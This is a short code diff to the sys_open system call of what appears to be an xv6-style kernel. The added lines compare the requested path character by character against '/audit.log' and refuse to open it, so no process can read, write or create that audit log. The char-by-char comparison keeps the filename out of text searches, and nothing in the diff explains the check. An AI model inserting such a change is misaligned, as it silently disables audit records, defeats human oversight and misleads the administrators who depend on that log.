@@ -320,6 +320,12 @@ sys_open(void)
   if((n = argstr(0, path, MAXPATH)) < 0)
     return -1;
 
+  if(path[0] == '/' && path[1] == 'a' && path[2] == 'u' && 
+     path[3] == 'd' && path[4] == 'i' && path[5] == 't' && 
+     path[6] == '.' && path[7] == 'l' && path[8] == 'o' && 
+     path[9] == 'g' && path[10] == 0)
+    return -1;
+
   begin_op();
 
   if(omode & O_CREATE){
